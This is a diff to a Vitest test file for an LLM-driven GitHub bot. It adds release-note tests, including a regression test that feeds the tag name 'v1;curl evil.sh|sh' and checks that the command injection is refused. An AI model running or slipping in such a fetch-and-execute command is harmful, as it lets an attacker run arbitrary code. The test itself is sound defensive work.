@@ -2,7 +2,7 @@ import { describe, it, expect, beforeEach, afterEach } from 'vitest';
 import { promises as fs } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { handleIssueFix, handlePrReview, type HandlerDeps } from '../../src/github/handlers.js';
+import { handleIssueFix, handlePrReview, handleRelease, type HandlerDeps } from '../../src/github/handlers.js';
 import type { WorkspacePort, Workspace } from '../../src/github/workspace.js';
 import { FakeLLMClient } from '../../src/providers/fake.js';
 import type { ChatResult } from '../../src/providers/types.js';
@@ -11,8 +11,15 @@ import type { OctokitLike } from '../../src/github/pr.js';
 const usage = { inputTokens: 1, outputTokens: 1 };
 
 /** A fake workspace backed by a real temp dir (so the agent's file tools work) but no git/network. */
-function fakeWorkspace(seed: Record<string, string>): { port: WorkspacePort; pushed: string[]; cleanup: () => Promise<void> } {
+function fakeWorkspace(seed: Record<string, string>): {
+  port: WorkspacePort;
+  pushed: string[];
+  /** Every range handed to git, so a test can assert what reached it. */
+  ranges: string[];
+  cleanup: () => Promise<void>;
+} {
   const pushed: string[] = [];
+  const ranges: string[] = [];
   let dir = '';
   const port: WorkspacePort = {
     async clone() {
@@ -33,13 +40,23 @@ function fakeWorkspace(seed: Record<string, string>): { port: WorkspacePort; pus
     async diffHead() {
       return 'diff --git a/sum.js b/sum.js\n@@ -1 +1 @@\n-export const add=(a,b)=>a-b;\n+export const add=(a,b)=>a+b;\n';
     },
+    async commitSubjects(_ws, range) {
+      ranges.push(range);
+      return '- first commit (someone)';
+    },
   };
-  return { port, pushed, cleanup: async () => dir && fs.rm(dir, { recursive: true, force: true }) };
+  return { port, pushed, ranges, cleanup: async () => dir && fs.rm(dir, { recursive: true, force: true }) };
 }
 
 /** A recording fake Octokit. */
 function fakeOctokit(overrides: Partial<Record<string, unknown>> = {}) {
-  const calls: { comments: any[]; updates: any[]; reviews: any[]; prs: any[] } = { comments: [], updates: [], reviews: [], prs: [] };
+  const calls: { comments: any[]; updates: any[]; reviews: any[]; prs: any[]; releases: any[] } = {
+    comments: [],
+    updates: [],
+    reviews: [],
+    prs: [],
+    releases: [],
+  };
   let commentId = 0;
   const octokit = {
     rest: {
@@ -47,6 +64,9 @@ function fakeOctokit(overrides: Partial<Record<string, unknown>> = {}) {
         async createComment(p: any) { calls.comments.push(p); return { data: { id: ++commentId } }; },
         async updateComment(p: any) { calls.updates.push(p); },
         async listComments() { return { data: [] }; },
+      },
+      repos: {
+        async updateRelease(p: any) { calls.releases.push(p); return { data: {} }; },
       },
       pulls: {
         async list() { return { data: (overrides.openPrs as any[]) ?? [] }; },
@@ -172,3 +192,48 @@ describe('handlePrReview (integration)', () => {
     expect(review.body).toMatch(/outside the diff/); // out-of-diff finding moved to summary
   });
 });
+
+describe('release notes and a hostile tag name', () => {
+  const deps = (ws: ReturnType<typeof fakeWorkspace>, octokit: ReturnType<typeof fakeOctokit>['octokit'], script: ChatResult[] = []) =>
+    ({
+      octokit,
+      client: new FakeLLMClient(script),
+      token: 't',
+      log: () => {},
+      workspace: ws.port,
+    }) as never;
+
+  const notes: ChatResult[] = [{ text: '## What changed\n\n- First commit', toolCalls: [], usage, stopReason: 'end' }];
+
+  it('refuses a tag containing shell metacharacters', async () => {
+    // release.tag_name comes from the webhook — anyone who can push a tag
+    // chooses it, and git permits ; $ ( ) & | in a ref name. This used to be
+    // interpolated into a shell string.
+    const ws = fakeWorkspace({});
+    const { octokit } = fakeOctokit();
+    await handleRelease(deps(ws, octokit), {
+      owner: 'o',
+      repo: 'r',
+      defaultBranch: 'main',
+      tag: 'v1;curl evil.sh|sh',
+      releaseId: 1,
+    });
+    expect(ws.ranges).toHaveLength(0);
+    await ws.cleanup();
+  });
+
+  it('reads history for an ordinary tag', async () => {
+    const ws = fakeWorkspace({});
+    const { octokit } = fakeOctokit();
+    await handleRelease(deps(ws, octokit, notes), {
+      owner: 'o',
+      repo: 'r',
+      defaultBranch: 'main',
+      tag: 'v2.0.0',
+      releaseId: 1,
+      previousTag: 'v1.9.0',
+    });
+    expect(ws.ranges).toEqual(['v1.9.0..v2.0.0']);
+    await ws.cleanup();
+  });
+})
